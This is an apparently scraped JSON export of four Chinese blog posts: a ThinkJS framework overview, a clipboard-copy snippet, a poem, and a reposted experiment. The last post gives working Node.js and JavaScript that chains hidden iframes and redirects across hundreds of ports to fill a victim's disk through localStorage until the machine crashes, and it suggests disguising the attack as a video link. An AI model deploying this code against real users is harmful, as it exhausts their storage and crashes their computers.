[{"title":"一款使用 ES6/7 特性全新开发的 Node.js MVC 框架ThinkJS","date":"2017-01-07T13:30:00.000Z","path":"2017/01/07/test/","text":"ThinkJS 是一款使用 ES6/7 特性全新开发的 Node.js MVC 框架，使用 ES7 中async/await，或者 ES6 中的 */yield 特性彻底解决了 Node.js 中异步嵌套的问题。同时吸收了国内外众多框架的设计理念和思想，让开发 Node.js 项目更加简单、高效。 使用 ES6/7 特性来开发项目可以大大提高开发效率，是趋势所在。并且新版的 Node.js 对 ES6 特性也有了较好的支持，即使有些特性还没有支持，也可以借助 Babel 编译来支持。 特性使用 ES6/7 特性来开发项目借助 Babel 编译，可以在项目中大胆使用 ES6/7 所有的特性，无需担心哪些特性当前版本不支持。尤其是使用 async/await 或者 */yield 来解决异步回调的问题。 12345678910111213141516171819202122//user controller, home/controller/user.jsexport default class extends think.controller.base &#123; //login action async loginAction(self)&#123; //如果是get请求，直接显示登录页面 if(this.isGet())&#123; return this.display(); &#125; //这里可以通过post方法获取所有的数据，数据已经在logic里做了校验 let data = this.post(); let md5 = think.md5(&quot;think_&quot; + data.pwd); //用户名和加密后的密码去匹配数据库中对于的条目 let result = await this.model(&quot;user&quot;).where(&#123;name: data.name, pwd: md5&#125;).find(); //如果未匹配到任何数据，表示用户名或者密码错误 if(think.isEmpty(result))&#123; return this.fail(&quot;login fail&quot;); &#125; //获取到用户信息后，将用户信息写入session await this.session(&quot;userInfo&quot;, result); return this.success(); &#125;&#125; 上面的代码我们使用了 ES6 里的 class, export, let 以及 ES7 里的 async 和 await 等特性，虽然查询数据库和写入 Session 都是异步操作，但借助 async/await，代码都是同步书写的。最后使用 Babel 进行编译，就可以稳定运行在 Node.js 的环境中了。 支持多种项目结构和多种项目环境项目支持单模块模式、普通模式、分模块模式等多种项目结构，可以满足各种项目复杂度的开发。 默认支持 development，testing 和 prodution 3 种项目环境，可以在不同的项目环境下进行不同的配置，满足在不同环境下的配置需求，同时还可以基于项目需要进行扩展。 支持丰富的数据库ThinkJS 支持 mysql, mongodb, sqlite 等常见的数据库，并且封装了很多操作数据库的接口，无需手动拼接 SQL 语句，还可以自动防止 SQL 注入等安全漏洞。同时支持事务、关联模型等高级功能。 代码自动更新ThinkJS 内置了一套代码自动更新的机制，文件修改后立即生效，不用重启 Node.js 服务，也不用借助第三方模块。 自动创建 REST 接口使用 thinkjs 命令可以自动创建 REST 接口，不用写任何的代码即可完成 REST API 的开发。如果想在 REST 接口中过滤字段或者进行权限校验，也很方便处理。 支持多种 WebSocket 库ThinkJS 支持 socket.io，sockjs 等常见的 WebSocket 库，并且对这些库进行包装，抹平各个库之间接口调用上的差异，给开发者一致的体验。 丰富的测试用例ThinkJS 含有 1500+ 的测试用例，代码覆盖率达到 95% ，每一次修改都有对应的测试用例来保障框架功能的稳定。 支持命令行调用执行定时任务ThinkJS 里的 Action除了可以响应用户的请求，同时支持在命令行下访问，借助这套机制就可以很方便的执行定时任务。 Hook 和 MiddlewareThinkJS 使用 Hook 和 Middleware 机制，可以灵活的对访问请求进行拦截处理。 详细的日志ThinkJS 内置了详细的日志功能，可以很方便的查看各种日志，方便追查问题。 HTTP 请求日志123[2015-10-12 14:10:03] [HTTP] GET /favicon.ico 200 5ms[2015-10-12 14:10:11] [HTTP] GET /zh-CN/doc.html 200 11ms[2015-10-12 14:10:11] [HTTP] GET /static/css/reset.css 200 3ms Socket 连接日志1[2015-10-12 14:13:54] [SOCKET] Connect mysql with mysql://root:root@127.0.0.1:3306 错误日志123[2015-10-12 14:15:32] [Error] Error: ER_ACCESS_DENIED_ERROR: Access denied for user &quot;root3&quot;@&quot;localhost&quot; (using password: YES)[2015-10-12 14:16:12] [Error] Error: Address already in use, port:8360. http://www.thinkjs.org/doc/error.html#EADDRINUSE 丰富的路由机制ThinkJS 支持正则路由、规则路由、静态路由等多种路由机制，并且可以基于模块来设置。可以让 URL 更加简洁的同时又不丢失性能。 支持国际化和多主题ThinkJS 使用很简单的方法就可以支持国际化和多主题等功能。 与其他框架的对比 与 express/koa 对比 express/koa 是 2 个比较简单的框架，框架本身提供的功能比较简单，项目中需要借助大量的第三方插件才能完成项目的开发，所以灵活度比较高。但使用很多第三方组件一方便提高了项目的复杂度，另一个方便第三方插件质量参差不齐，也会带来内存泄漏等风险。 koa 使用 ES6 里的 /yield 解决了异步回调的问题，但 /yield 只会是个过渡解决方案，会被 ES7 里的 async/await 所替代。 而 ThinkJS 提供了整套解决方案，每个功能都经过了严格的性能和内存泄漏等方面的测试，并且在项目中可以直接使用 ES6/7 所有的特性。 与 sails 对比sails 也是一个提供整套解决方案的 Node.js 框架，对数据库、REST API、安全方面也很多封装，使用起来比较方便。 但 sails 对异步回调的问题还没有优化，还是使用 callback 的方式，给开发带来很大的不便，导致项目中无法较好的使用 ES6/7 特性。 ThinkJS 的不足上面说了很多 ThinkJS 的优点，当然 ThinkJS 也有很多的不足。如： 框架还比较新，缺少社区等方面的支持还没有经过超大型项目的检验","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"},{"name":"代码片段","slug":"代码片段","permalink":"http://yoursite.com/tags/代码片段/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"用 JavaScript 实现点击文字复制到粘贴板","date":"2016-07-07T13:30:00.000Z","path":"2016/07/07/untils-jscopy/","text":"当点击 复制 按钮的时候, 将选中的文字复制到粘贴板上 核心代码 1234// 获取 input 元素let input = document.querySelector('#showLink');input.focus();input.select(); 123// 执行复制命令document.execCommand('Copy');document.execCommand() 介绍 在这段代码里, 其实最核心也让人陌生的应该就是 document.execCommand() 方法了, 该方法的大概用途是 对选中区域 进行一些操作 有关这个方法的具体介绍, 请移步这里这里","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"},{"name":"代码片段","slug":"代码片段","permalink":"http://yoursite.com/tags/代码片段/"}]},{"title":"[阅读]碧海蓝天","date":"2016-07-06T14:30:00.000Z","path":"2016/07/06/read-bihailantian/","text":"爱如雨水降落在我身上 亦如微风般从容温润 耳中只有起伏的呼吸声 仿若海上的波涛汹涌澎湃 我脑子里的欲望 如一团狂暴欲念之火熊熊燃烧 我慢慢旋转而又消失于黑暗中 大地也陷入火焰 想要找回遗失之物 总有那么一天会找回来 然后我听到心中美好之事冉冉升起 从大地黑暗深处蓦地升起 此生永在 无需证明 也无需言语 而今我已接受了很多挑战和苦难 可仍要历经世间一切诱惑 直到再也听不见世界的呼喊 我将坠入天堂 化为你身旁的一粒尘埃","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"},{"name":"黑科技","slug":"黑科技","permalink":"http://yoursite.com/tags/黑科技/"}]},{"title":"作为一个前端，可以如何机智地弄坏一台电脑？","date":"2015-07-06T14:30:00.000Z","path":"2015/07/06/hack-in-localstorage/","text":"有人说，前端的界限就在浏览器那儿。 无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。然而，作为一个前端，我发现是有方式打开次元大门的… 这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。 起因故事得从localStorage说起。 html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。windows下的chrome，localStorage存储于C:\\Users\\xxx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。 对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。 那么问题就变成：这样的限制足够保护用户硬盘了吗？ 关键关键的问题在于，这一限制，针对的是一个域名+端口。也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。 我用node简单地开启了服务器，这时，用户访问http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html： 1234567891011121314151617var http = require(&apos;http&apos;);var fs = require(&apos;fs&apos;);//100个端口for(var port = 1000; port&lt; 1100; port++)&#123; http.createServer(function (request, response) &#123; //请忽略这种循环读文件的方式，只为了简便 fs.readFile(&apos;./index.html&apos;, function(err, content)&#123; if(err) &#123; &#125; else &#123; response.writeHead(200, &#123; &apos;Content-Type&apos; : &apos;text/html; charset=UTF-8&apos; &#125;); response.write(content); response.end(); &#125; &#125;); &#125;).listen(port, &apos;127.0.0.1&apos;);&#125; 当然，这个index.html里涉及了localStorage写操作。 123456var s = &quot;&quot;;//慢慢来，别写太大了，好害怕…for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;;&#125;localStorage.setItem(&quot;testData&quot;, s); 我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。 自动遍历但这种程度还不够。如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？ iframe是个好的尝试。只要一打开http://127.0.0.1: 1000，页面的脚步就会创建一个iframe，去请求http://127.0.0.1: 1001，一直循环下去。 1234567891011121314151617181920212223var Main = (function()&#123; var _key = &quot;testData&quot;; var _max = 1100; //最大限制 return &#123; init: function()&#123; //慢慢来，别写太大了，好害怕… var s = &quot;&quot;; for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;; &#125; localStorage.setItem(_key, s); var port = parseInt(location.port)+1; if(port &gt; _max) return; //新添加iframe var url = &quot;http://127.0.0.1:&quot; + port; var $iframe = document.createElement(&quot;iframe&quot;); $iframe.src = url; document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe); &#125; &#125;&#125;)(); 当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。 然后我就看到请求如潮水渐涨： 但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。 ###防止浏览器崩溃 C盘还未撑满，同志还需努力。怎么办？ 突然想到，到达iframe极限之前，我们可以重定向啊。每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。 1234567891011121314151617181920212223242526272829var Main = (function()&#123; var _key = &quot;testData&quot;; var _max = 1200; //最大限制 var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转 return &#123; init: function()&#123; //慢慢来，别写太大了，好害怕… var s = &quot;&quot;; for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;; &#125; localStorage.setItem(_key, s); var port = parseInt(location.port)+1; if(port &gt; _max) return; if(port % _jumpSpace == 0)&#123; //每50个，重定向一次 window.location.href = url; &#125;else&#123; //新添加iframe var $iframe = document.createElement(&quot;iframe&quot;); $iframe.src = url; document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe); &#125; &#125; &#125;&#125;)(); 事实证明，这种蛮拼的方法的确可行。 至此，只要访问http://127.0.0.1: 1000，就会往Local Storage文件夹里写入近500M无用数据： 里面的数据是这样的： 继续实验的黑科技算了下我的C盘还有空间嘛，那就把端口数量从100增长到200个。结果是这样的，到达了1.17G大小。 在后续的实验中，我就慢慢的把端口数量与存储的数据调大。 电脑也运行得越来越慢。这是为什么呢？ 我观察到，有时候执行localStorage.setItem()后，在文件夹里不一定立即能看到数据文件。怀疑这些数据会被chrome先放到内存里，以避免重复读写带来的消耗，在空闲或关闭的时机，再写进硬盘里。 但此时，浏览器已经影响到系统了。它处于一种“不会崩溃”，但“因为占用了许多内存，已经妨碍用户电脑的正常使用”的状态。即使用户关闭了浏览器窗口，也不会很快恢复。要知道读写任务并不是随窗口关闭而终止的，否则浏览器会丢失数据。 遭遇黑科技的人们能做的只有： 等待； 用任务管理器关掉chrome进程，再等待； 相信并尝试“重启电脑解决90%电脑问题”的科学论断 可以说，浏览器的内心几乎是崩溃的。 最后最后，还是得用严肃脸告诫一下：害人之心不可无。本实验，从一开始就是怀揣着将安全问题上交给国家的初衷去做的（是的就是这么纯粹）。 后续，看着C盘还有2G空间，我又把端口增长到2000个，试下会发生什么。由于请求过多，需要一定时间，我就去做别的事情了。回来后发现房间安静祥和，美轮美奂，一片蓝光，像是加了特技。 那么问题来了，计算机修理哪家强？有点急… 转自 主题yilia提供者","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"},{"name":"黑科技","slug":"黑科技","permalink":"http://yoursite.com/tags/黑科技/"}]}]